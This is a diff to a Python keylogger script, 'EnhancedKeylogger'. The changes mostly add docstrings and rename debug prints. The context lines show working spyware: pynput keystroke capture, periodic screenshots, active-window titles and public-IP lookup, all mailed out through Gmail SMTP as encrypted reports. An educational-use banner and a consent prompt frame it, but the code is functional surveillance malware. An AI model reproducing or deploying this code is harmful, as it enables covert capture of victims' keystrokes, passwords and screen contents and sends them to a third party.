@@ -11,7 +11,7 @@
 
 # ⚠️ FOR EDUCATIONAL PURPOSES ONLY. USE WITH EXPLICIT CONSENT ⚠️
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
+#!/usr/bin/env python3
 
 import os
 import tempfile
@@ -33,9 +33,14 @@ from pynput import keyboard
 from cryptography.fernet import Fernet
 
 class EnhancedKeylogger:
+    """A secure, ethical keylogger for monitoring with explicit user consent."""
+    
+    EMAIL_SUBJECT_PREFIX = "Keylogger Report -"
+
     def __init__(self, log_interval=300, screenshot_interval=60,
                  from_email=None, password=None, to_email=None,
                  encryption_key=None):
+        """Initialize keylogger with configuration."""
         self.log = ""
         self.log_interval = log_interval
         self.screenshot_interval = screenshot_interval
@@ -58,6 +63,7 @@ class EnhancedKeylogger:
         self._validate_config()
 
     def _setup_logging(self):
+        """Configure logging for the keylogger."""
         logging.basicConfig(
             level=logging.INFO,
             format='%(asctime)s - %(levelname)s - %(message)s',
@@ -69,21 +75,26 @@ class EnhancedKeylogger:
         logging.info("Keylogger initialized with encryption")
 
     def _validate_config(self):
+        """Check if email configuration is complete."""
         if not self.from_email or not self.password or not self.to_email:
             logging.warning("Email configuration is incomplete")
 
     def _secure_temp_file(self, suffix='.jpg'):
+        """Create a secure temporary file."""
         fd, path = tempfile.mkstemp(suffix=suffix)
         os.close(fd)
         return path
 
     def encrypt_data(self, data):
+        """Encrypt data using Fernet."""
         return self.fernet.encrypt(data.encode())
 
     def _generate_log_hash(self, data):
+        """Generate SHA-256 hash of data."""
         return hashlib.sha256(data.encode()).hexdigest()
 
     def take_screenshot(self):
+        """Capture and store a screenshot."""
         try:
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
             path = self._secure_temp_file()
@@ -96,6 +107,7 @@ class EnhancedKeylogger:
             logging.error(f"Screenshot error: {e}")
 
     def prepare_screenshots(self):
+        """Prepare screenshots for email attachment."""
         for file in self.pictures:
             try:
                 with open(file["path"], "rb") as img:
@@ -106,6 +118,7 @@ class EnhancedKeylogger:
                 logging.error(f"Screenshot processing error: {e}")
 
     def get_active_window_title(self):
+        """Get the title of the currently active window."""
         try:
             import subprocess
             win_id = subprocess.check_output(["xdotool", "getactivewindow"]).strip()
@@ -115,6 +128,7 @@ class EnhancedKeylogger:
             return "Window Fetch Failed"
 
     def on_press(self, key):
+        """Handle key press events."""
         current_key = ""
         try:
             if any(key in combo for combo in self.COMBINATIONS):
@@ -142,6 +156,7 @@ class EnhancedKeylogger:
             logging.error(f"Key processing error: {e}")
 
     def on_release(self, key):
+        """Handle key release events."""
         try:
             if any(key in combo for combo in self.COMBINATIONS):
                 self.current_key_list.discard(key)
@@ -149,6 +164,7 @@ class EnhancedKeylogger:
             logging.error(f"Key release error: {e}")
 
     def report(self, condition=1):
+        """Generate and send a report based on condition."""
         try:
             if condition == 1:
                 log_hash = self._generate_log_hash(self.log)
@@ -169,6 +185,7 @@ class EnhancedKeylogger:
             self.mail = MIMEMultipart()
 
     def _send_email(self, encrypted_log=None):
+        """Send email with optional encrypted log attachment."""
         retries = 3
         for attempt in range(retries):
             try:
@@ -178,7 +195,7 @@ class EnhancedKeylogger:
                     self.status = False
                     self.mail.attach(MIMEText(self._system_info(), "html"))
                 timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
-                self.mail["Subject"] = f"Keylogger Report - {self.user} @ {timestamp}"
+                self.mail["Subject"] = f"{self.EMAIL_SUBJECT_PREFIX} {self.user} @ {timestamp}"
                 self.mail["From"] = self.from_email
                 with smtplib.SMTP("smtp.gmail.com", 587) as server:
                     server.starttls()
@@ -191,6 +208,7 @@ class EnhancedKeylogger:
         logging.critical("All email attempts failed.")
 
     def _system_info(self):
+        """Generate HTML-formatted system information."""
         try:
             public_ip = requests.get('https://api.ipify.org', timeout=5).text
         except:
@@ -207,6 +225,7 @@ class EnhancedKeylogger:
         """
 
     def start(self):
+        """Start the keylogger with explicit user consent."""
         try:
             consent = input("Do you have explicit consent to run this? (y/n): ")
             if consent.lower() != 'y':
@@ -233,8 +252,8 @@ if __name__ == "__main__":
     Unauthorized use violates privacy laws and ethics
     ===========================================
     """)
-    # DEBUG: Verify class methods
-    print("[DEBUG] Methods in EnhancedKeylogger class:", dir(EnhancedKeylogger))
+    # Debug verification
+    print("[DEBUG] EnhancedKeylogger class methods:", dir(EnhancedKeylogger))
     try:
         keylogger = EnhancedKeylogger(
             log_interval=300,
@@ -243,8 +262,7 @@ if __name__ == "__main__":
             password=os.getenv("EMAIL_PASSWORD"),
             to_email=os.getenv("RECEIVER_EMAIL")
         )
-        # DEBUG: Verify instance methods
-        print("[DEBUG] Methods in keylogger instance:", dir(keylogger))
+        print("[DEBUG] keylogger instance methods:", dir(keylogger))
         keylogger.start()
     except Exception as e:
         logging.critical(f"Initialization failed: {e}")
